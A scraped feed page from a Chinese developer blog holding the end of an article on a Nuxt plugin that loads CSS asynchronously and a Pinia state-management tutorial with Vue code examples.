    <span class="hljs-keyword">if</span> (href.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'entry'</span>) &amp;&amp; href.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'.css'</span>)) {
      link.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'media'</span>, <span class="hljs-string">'print'</span>)
      link.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">const</span> linkElement = <span class="hljs-variable language_">this</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLLinkElement</span>
        linkElement.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'media'</span>, <span class="hljs-string">'all'</span>)
      }
    }
  })
}

<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">readyState</span> === <span class="hljs-string">'loading'</span>) {
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'DOMContentLoaded'</span>, optimizeCSSLoading)
} <span class="hljs-keyword">else</span> {
  <span class="hljs-built_in">setTimeout</span>(optimizeCSSLoading, <span class="hljs-number">0</span>)
}
</code></pre>
<p>}
})
`</p>
<h2 data-id="heading-0">plugins文件夹下创建async-css.client文件</h2>
<h2 data-id="heading-1">vue3+ts+nuxt.js+sass+pina+vuetify+unocss+autoprefixer</h2>
<p>这是一个用于优化 CSS 加载性能的 Nuxt 插件。
async-css.client.ts 实现了“异步 CSS 加载”优化，用于提升首屏渲染</p>
<h2 data-id="heading-2">工作原理</h2>
<ol>
<li>查找入口 CSS 文件：查找所有包含 entry 和 .css 的样式表链接（通常是 Nuxt 生成的入口 CSS）。</li>
<li>临时设置为打印媒体：将这些 CSS 的 media 属性设为 print，使其不阻塞渲染。</li>
<li>加载完成后恢复：CSS 加载完成后，将 media 改回 all，样式生效。</li>
</ol>
<h2 data-id="heading-3">为什么这样做？</h2>
<ul>
<li>问题：CSS 是渲染阻塞资源，会阻塞页面渲染，导致白屏。</li>
<li>解决：通过 media="print" 让浏览器异步加载，不阻塞渲染，加载完成后再应用样式。</li>
</ul>
<h2 data-id="heading-4">注意事项</h2>
<ul>
<li>优点：减少首屏阻塞，提升 FCP/LCP。</li>
<li>风险：可能出现短暂无样式（FOUC），但通常不明显。</li>
<li>
<h2 data-id="heading-5">建议</h2>
</li>
</ul>
<h2 data-id="heading-6">如果遇到样式闪烁或加载问题，可以：</h2>
<ol>
<li>移除该插件（删除文件）</li>
<li>或调整逻辑，只对非关键 CSS 应用此优化</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Pinia 深度解析：现代Vue应用状态管理最佳实践]]></title>    <link>https://juejin.cn/post/7592922036092616719</link>    <guid>https://juejin.cn/post/7592922036092616719</guid>    <pubDate>2026-01-09T06:29:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592922036092616719" data-draft-id="7592960378689781795" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Pinia 深度解析：现代Vue应用状态管理最佳实践"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2026-01-09T06:29:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="爱分享的鱼鱼"/> <meta itemprop="url" content="https://juejin.cn/user/3901536646733133"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Pinia 深度解析：现代Vue应用状态管理最佳实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3901536646733133/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    爱分享的鱼鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:29:39.000Z" title="Fri Jan 09 2026 06:29:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"•";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">什么是 Pinia？</h2>
<p>Pinia 是 Vue.js 官方推荐的状态管理库，它取代了 Vuex 成为 Vue 3 应用的首选状态管理方案。相比 Vuex，Pinia 提供了更简洁、直观的 API，并且具有出色的 TypeScript 支持。</p>
<h3 data-id="heading-1">Pinia 的核心优势</h3>
<ul>
<li><strong>轻量级</strong>：体积更小，性能更好</li>
<li><strong>直观</strong>：API 设计更简单，学习成本低</li>
<li><strong>TypeScript 支持</strong>：原生支持 TypeScript，无需额外配置</li>
<li><strong>开发工具集成</strong>：与 Vue DevTools 完美集成</li>
<li><strong>热更新</strong>：支持模块热替换，提升开发体验</li>
</ul>
<h2 data-id="heading-2">Pinia 核心概念</h2>
<h3 data-id="heading-3">1. Store（存储）</h3>
<p>Store 是 Pinia 中保存状态的地方，它是使用 <code>defineStore()</code> 函数创建的。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>

<span class="hljs-comment">// 创建名为 counter 的 store</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCounterStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'counter'</span>, {
  <span class="hljs-comment">// store 的实现</span>
})
</code></pre>
<h3 data-id="heading-4">2. State（状态）</h3>
<p>State 是存储数据的地方，相当于组件中的 data。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCounterStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'counter'</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">name</span>: <span class="hljs-string">'Eduardo'</span>
  })
})
</code></pre>
<h3 data-id="heading-5">3. Getters（计算属性）</h3>
<p>Getters 相当于组件中的 computed，用于计算派生状态。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCounterStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'counter'</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>
  }),
  <span class="hljs-attr">getters</span>: {
    <span class="hljs-attr">doubleCount</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">count</span> * <span class="hljs-number">2</span>,
    <span class="hljs-title function_">doubleCountPlusOne</span>(): number {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">doubleCount</span> + <span class="hljs-number">1</span>
    }
  }
})
</code></pre>
<h3 data-id="heading-6">4. Actions（操作）</h3>
<p>Actions 相当于组件中的 methods，用于处理业务逻辑。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCounterStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'counter'</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>
  }),
  <span class="hljs-attr">actions</span>: {
    <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++
    },
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getData</span>()
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">data</span> = response.<span class="hljs-property">data</span>
    }
  }
})
</code></pre>
<h2 data-id="heading-7">Pinia 在实际项目中的应用</h2>
<h3 data-id="heading-8">1. 安装和配置</h3>
<pre><code class="hljs language-bash" lang="bash">npm install pinia
</code></pre>
<p>在 <code>main.js</code> 中安装 Pinia：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { createPinia } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
<span class="hljs-keyword">const</span> pinia = <span class="hljs-title function_">createPinia</span>()

app.<span class="hljs-title function_">use</span>(pinia)
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<h3 data-id="heading-9">2. 创建 Store</h3>
<p>让我们以一个酒店管理系统为例，创建一个存储订单相关数据的 store：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// stores/commonLists.js</span>
<span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCommonListsStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'commonLists'</span>, {
  <span class="hljs-comment">// 状态</span>
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">orderSourceList</span>: [],
    <span class="hljs-attr">orderCustomerList</span>: [],
    <span class="hljs-attr">loading</span>: {
      <span class="hljs-attr">orderSources</span>: <span class="hljs-literal">false</span>,
      <span class="hljs-attr">orderCustomers</span>: <span class="hljs-literal">false</span>
    }
  }),

  <span class="hljs-comment">// 计算属性</span>
  <span class="hljs-attr">getters</span>: {
    <span class="hljs-attr">getOrderSourceList</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">orderSourceList</span>,
    <span class="hljs-attr">getOrderCustomerList</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">orderCustomerList</span>,
    <span class="hljs-attr">isLoadingOrderSources</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">loading</span>.<span class="hljs-property">orderSources</span>,
    <span class="hljs-attr">isLoadingOrderCustomers</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">loading</span>.<span class="hljs-property">orderCustomers</span>
  },

  <span class="hljs-comment">// 操作方法</span>
  <span class="hljs-attr">actions</span>: {
    <span class="hljs-comment">// 获取订单来源列表</span>
    <span class="hljs-keyword">async</span> <span class="hljs-title function_">fetchOrderSources</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">orderSourceList</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">data</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">orderSourceList</span> }
      }

      <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span>.<span class="hljs-property">orderSources</span> = <span class="hljs-literal">true</span>
      <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 模拟 API 请求</span>
        <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getAllOrderSources</span>()
        <span class="hljs-keyword">if</span> (response &amp;&amp; response.<span class="hljs-property">records</span>) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">orderSourceList</span> = response.<span class="hljs-property">records</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> ({
            <span class="hljs-attr">value</span>: item.<span class="hljs-property">id</span>,
            <span class="hljs-attr">label</span>: item.<span class="hljs-property">name</span>
          }))
          <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">data</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">orderSourceList</span> }
        }
      } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'获取订单来源失败:'</span>, error)
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">success</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">message</span>: error.<span class="hljs-property">message</span> }
      } <span class="hljs-keyword">finally</span> {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">loading</span>.<span class="hljs-property">orderSources</span> = <span class="hljs-literal">false</span>
      }
    }
  }
})
</code></pre>
<h3 data-id="heading-10">3. 在组件中使用 Store</h3>
<h4 data-id="heading-11">基本使用方式</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;script setup&gt;
import { useCommonListsStore } from '@/stores/commonLists'

const commonListsStore = useCommonListsStore()

// 访问状态
console.log(commonListsStore.orderSourceList)

// 调用 action
await commonListsStore.fetchOrderSources()
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-12">在模板中使用</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;select v-model="selectedSource"&gt;
      &lt;option 
        v-for="source in commonListsStore.orderSourceList" 
        :key="source.value"
        :value="source.value"
      &gt;
        {{ source.label }}
      &lt;/option&gt;
    &lt;/select&gt;
    
    &lt;div v-if="commonListsStore.isLoadingOrderSources"&gt;
      正在加载...
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'
import { useCommonListsStore } from '@/stores/commonLists'

const commonListsStore = useCommonListsStore()
const selectedSource = ref('')

// 组件挂载时加载数据
commonListsStore.fetchOrderSources()
&lt;/script&gt;
</code></pre>
<h2 data-id="heading-13">Pinia 高级特性</h2>
<h3 data-id="heading-14">1. Store 之间的相互依赖</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'user'</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">name</span>: <span class="hljs-string">''</span>,
    <span class="hljs-attr">age</span>: <span class="hljs-number">0</span>
  })
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useMainStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'main'</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">count</span>: <span class="hljs-number">99</span>
  }),
  <span class="hljs-attr">getters</span>: {
    <span class="hljs-comment">// 使用其他 store 的状态</span>
    <span class="hljs-attr">doubleCount</span>: <span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> state.<span class="hljs-property">count</span> * <span class="hljs-number">2</span>
  },
  <span class="hljs-attr">actions</span>: {
    <span class="hljs-comment">// 在 action 中使用其他 store</span>
    <span class="hljs-title function_">incrementWithUserAge</span>(<span class="hljs-params"/>) {
      <span class="hljs-keyword">const</span> userStore = <span class="hljs-title function_">useUserStore</span>()
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> += userStore.<span class="hljs-property">age</span>
    }
  }
})
</code></pre>
<h3 data-id="heading-15">2. Store 持久化</h3>
<p>使用 <code>pinia-plugin-persistedstate</code> 插件实现数据持久化：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createPinia } <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia'</span>
<span class="hljs-keyword">import</span> piniaPluginPersistedstate <span class="hljs-keyword">from</span> <span class="hljs-string">'pinia-plugin-persistedstate'</span>

<span class="hljs-keyword">const</span> pinia = <span class="hljs-title function_">createPinia</span>()
pinia.<span class="hljs-title function_">use</span>(piniaPluginPersistedstate)

<span class="hljs-comment">// 在 store 中配置持久化</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useCounterStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'counter'</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>
  }),
  <span class="hljs-attr">persist</span>: <span class="hljs-literal">true</span>  <span class="hljs-comment">// 启用持久化</span>
})
</code></pre>
<h3 data-id="heading-16">3. Store 的模块化</h3>
<p>对于大型应用，建议按功能模块划分 store：</p>
<pre><code class="hljs language-bash" lang="bash">stores/
├── index.js          <span class="hljs-comment"># 导出所有 store</span>
├── user.js           <span class="hljs-comment"># 用户相关状态</span>
├── product.js        <span class="hljs-comment"># 产品相关状态</span>
├── cart.js           <span class="hljs-comment"># 购物车状态</span>
└── commonLists.js    <span class="hljs-comment"># 公共列表数据</span>
</code></pre>
<h2 data-id="heading-17">最佳实践</h2>
<h3 data-id="heading-18">1. Store 命名规范</h3>
<ul>
<li>使用 <code>use</code> 前缀命名 store 函数</li>
<li>Store 名称应反映其功能</li>
<li>避免 store 名称冲突</li>
</ul>
<h3 data-id="heading-19">2. 状态管理原则</h3>
<ul>
<li><strong>单一数据源</strong>：每个数据片段只应在一处定义</li>
<li><strong>状态不可变性</strong>：直接修改 state，而不是通过 setter</li>
